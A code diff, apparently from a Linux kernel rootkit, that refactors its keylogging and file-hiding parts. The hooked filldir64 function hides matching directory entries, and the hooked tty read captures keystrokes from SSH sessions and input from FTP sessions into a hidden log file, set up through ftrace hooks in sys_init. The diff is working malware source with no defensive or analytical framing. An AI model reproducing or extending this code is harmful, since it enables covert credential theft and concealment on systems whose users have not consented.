@@ -746,10 +746,10 @@ static int m_filldir(struct dir_context *ctx, const char *name, int namlen,loff_
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6,1,0)
 static bool  (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
-static bool m_filldir64(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
+static bool m_filldir64(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
 #else
 static int  (*real_filldir64)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
-static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned int d_type) {
+static int m_filldir64(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
 #endif
 
     if (fs_search_name(name, ino))
@@ -757,89 +757,18 @@ static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,lof
     return real_filldir64(ctx, name, namlen, offset, ino, d_type);
 }
 
-#define MAXKEY 512
 static LIST_HEAD(keylog_node);
-struct keylog_t {
-    char buf[MAXKEY+2]; /** newline+'\0' */
-    int offset;
-    uid_t uid;
-    struct list_head list;
-};
+static struct file *filp;
 
 static void __attribute__((unused))
 _tty_dump(uid_t uid, pid_t pid, char *buf, ssize_t len) {
     prinfo("%s\n", buf);
 }
 
-
-static int inline _key_add(uid_t uid, char byte, int flags) {
-    struct keylog_t *kl;
-    int rv = 0;
-
-    if ((flags & R_RETURN) || (!(flags & R_RANGE)))
-        return rv;
-
-    kl = kcalloc(1, sizeof(struct keylog_t) , GFP_KERNEL);
-    if (!kl) {
-        prerr("Insufficient memory\n");
-        rv = -ENOMEM;
-    } else {
-        kl->offset = 0;
-        kl->buf[kl->offset++] = byte;
-        kl->uid = uid;
-        list_add_tail(&kl->list, &keylog_node);
-    }
-
-    return rv;
-}
-
-static int _key_update(uid_t uid, char byte, int flags) {
-    struct keylog_t  *node, *node_safe;
-    bool new = true;
-    int rv = 0;
-
-    list_for_each_entry_safe(node, node_safe, &keylog_node, list) {
-        if (node->uid != uid) continue;
-
-        if (flags & R_RETURN) {
-            node->buf[node->offset++] = '\n';
-            node->buf[node->offset] = 0;
-
-            kv_tty_write(uid, node->buf, strlen(node->buf));
-
-            list_del(&node->list);
-            kfree(node);
-        } else if((flags & R_RANGE) || (flags & R_NEWLINE)) {
-            if (node->offset < MAXKEY) {
-                node->buf[node->offset++] = byte;
-            }
-            else {
-                prwarn("Warning: max length reached: %d\n", MAXKEY);
-                return -ENOMEM;
-            }
-        }
-        new = false;
-        break;
-    }
-
-    if (new)
-        rv = _key_add(uid, byte, flags);
-
-    return rv;
-}
-
-static void _keylog_cleanup_list(void) {
-    struct keylog_t *node, *node_safe;
-    list_for_each_entry_safe(node, node_safe, &keylog_node, list) {
-        list_del(&node->list);
-        kfree(node);
-        node = NULL;
-    }
-}
-
 void _keylog_cleanup(void) {
-    _keylog_cleanup_list();
-    kv_tty_close();
+    kv_tty_close(&keylog_node);
+    fs_kernel_close_file(filp);
+    filp = NULL;
     fs_file_rm(sys_get_ttyfile());
 }
 
@@ -909,10 +838,10 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
          */
         if ((app_flag & APP_FTP) && rv > 1) {
             ttybuf[strcspn(ttybuf, "\r")] = '\0';
-            kv_tty_write(uid, ttybuf, sizeof(ttybuf));
+            kv_tty_write(filp, uid, ttybuf, sizeof(ttybuf));
         } else if (app_flag & APP_SSH &&
                 (rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
-            _key_update(uid, byte, flags);
+            kv_key_update(&keylog_node, filp, uid, byte, flags);
         }
     }
 out:
@@ -1291,7 +1220,8 @@ bool sys_init(void) {
                 prinfo("sys_init: ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
 
             /** Init tty log */
-            if (kv_tty_open(sys_get_ttyfile()) != true) {
+            filp = kv_tty_open(&filp, sys_get_ttyfile());
+            if (!filp) {
                 prerr("sys_init: Failed loading tty file\n");
                 rc = false;
             }
